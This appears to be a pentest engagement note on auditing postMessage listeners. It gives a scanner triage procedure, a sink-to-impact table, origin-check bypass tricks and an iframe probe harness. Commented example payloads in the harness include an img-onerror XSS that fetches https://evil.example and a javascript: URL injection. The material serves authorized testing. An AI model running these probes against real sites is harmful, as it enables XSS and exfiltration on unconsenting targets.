# postMessage audit

Companion to `scripts/postmessage_scan.py` (offline triage). CWE-345 /
CWE-1022.

## Triage procedure

1. Collect every JS file from the P1 crawl (bundles, inline scripts saved
   separately).
2. `python3 postmessage_scan.py --js-file bundle.js` — flags:
   - `LISTENER-NO-ORIGIN-CHECK`: `addEventListener('message', ...)` handler
     with no `origin` comparison in the following lines.
   - `LISTENER-OK`: origin check observed (still verify the check is
     correct — `includes()`/`endsWith()` suffix tricks apply here too).
   - `SENDER-STAR`: `postMessage(data, '*')` — leaks to any embedder.
   - `SENDER-EXPLICIT`: `postMessage(data, 'https://...')` — record target.
3. For every `LISTENER-NO-ORIGIN-CHECK`, extract the handler body and map
   `event.data` flow into sinks:

| Sink | Impact |
|---|---|
| `innerHTML` / `document.write` / framework HTML binding | HTML injection -> XSS in the target origin |
| `eval` / `new Function` / `setTimeout(string)` | JS execution |
| `element.src` / `href` assignment | javascript:/attacker URL injection |
| `window.location` / `location.href` | forced navigation (redirect chain) |
| relay `postMessage(..., '*')` | message laundering into another frame |
| `fetch()` argument / options | request forgery in the victim origin |

4. Verify checks that exist: `event.origin === 'https://target.example.com'`
   is correct; `event.origin.includes('target.example.com')` falls to
   `https://target.example.com.attacker.example` (suffix trick);
   `startsWith('https://target.example.com')` falls to
   `https://target.example.com.evil.example`.

## Harness page skeleton

Serve from the operator-controlled test host; run under `agent_browser` with
screenshots at each step. Replace UPPERCASE values.

```html
<!doctype html>
<!-- rj-pt-<ENGAGEMENT>-<NONCE> postMessage probe harness -->
<html>
<body>
<iframe id="t" src="https://TARGET.example.com/PAGE" style="width:800px;height:600px"></iframe>
<script>
  const t = document.getElementById('t');
  // 1. eavesdrop: what does the target send, and to whom?
  window.addEventListener('message', (e) => {
    console.log('[pm-harness] saw message from', e.origin, JSON.stringify(e.data));
  });
  // 2. probe: send the crafted message with '*' (no trust required)
  function probe(payload) {
    t.contentWindow.postMessage(payload, '*');
  }
  // craft per the sink found: html sink, url sink, location sink...
  // e.g. probe({html: '<img src=x onerror="fetch(\'https://evil.example/c?rj-pt-NONCE\')">'});
  // e.g. probe({url: 'javascript:alert(1)'});
  // 3. observe: DOM mutation / navigation in the iframe; screenshot after each probe
  t.onload = () => setTimeout(() => probe(PROBE_PAYLOAD), 500);
</script>
</body>
</html>
```

Notes:
- The eavesdrop step doubles as sender-analysis when the target emits
  messages with `'*'`.
- Keep payloads canary-tagged; screenshots + console capture are the
  evidence.

## Evidence

- JS excerpt with file name + line numbers of the listener/sender.
- Harness page source, sent payload, screenshots (before/after per probe),
  and any navigation/DOM diff.
- D2: replay once against a fresh session of the target page.
